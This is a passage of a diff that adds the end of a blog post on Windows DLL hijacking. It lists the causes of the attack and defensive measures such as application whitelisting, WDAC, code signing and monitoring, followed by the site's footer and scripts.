+<p><strong>Misconfigured Folder Permissions</strong>: This issue can arise from the installation of third-party applications. While it may not always occur, system administrators should regularly check and verify the permissions of folders within the system to ensure they are correctly configured.</p>
+</li>
+<li>
+<p><strong>Abuse of Privileged File Operations</strong>: This problem stems from weaknesses in the application&rsquo;s architecture. Developers should review and update the code to prevent such operations on files and folders that can be managed by users.</p>
+</li>
+</ul>
+<h3 id="additional-defenses">Additional Defenses</h3>
+<ul>
+<li>
+<p><strong>Implement Application Whitelisting</strong>: Use application whitelisting to ensure that only approved applications and DLLs can be executed. This helps prevent unauthorized DLLs from being loaded.</p>
+</li>
+<li>
+<p><strong>Enable Windows Defender Application Control (WDAC)</strong>: WDAC can help control the execution of applications and DLLs, providing an additional layer of security.</p>
+</li>
+<li>
+<p><strong>Regularly Update Software</strong>: Ensure that all software, including third-party applications, is kept up to date with the latest security patches and updates.</p>
+</li>
+<li>
+<p><strong>Use Digital Signatures</strong>: Require that all DLLs and executables be digitally signed. This helps verify the integrity and authenticity of the files before they are loaded.</p>
+</li>
+<li>
+<p><strong>Monitor and Audit System Activity</strong>: Implement monitoring and auditing tools to track system activity and detect any suspicious behavior related to DLL loading and execution.</p>
+</li>
+</ul>
+<p>By implementing these measures, you can enhance your defenses against DLL hijacking and reduce the risk of exploitation.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-03-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/path-dll-hijacking/">Path Dll Hijacking</a>,&nbsp;<a href="/tags/dll-hijacking-sideloading/">Dll Hijacking Sideloading</a>,&nbsp;<a href="/tags/local-privilege-escalation/">Local Privilege Escalation</a>,&nbsp;<a href="/tags/windows/">Windows</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/windows-privesc-path-hijacking/" class="prev" rel="prev" title="Windows Local Privilege Escalation - PATH Hijacking for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation - PATH Hijacking for CTF Creators</a>
+            <a href="/windows-privesc-credential-hunting/" class="next" rel="next" title="Windows Local Privilege Escalation - Credential Hunting for CTF Creators">Windows Local Privilege Escalation - Credential Hunting for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
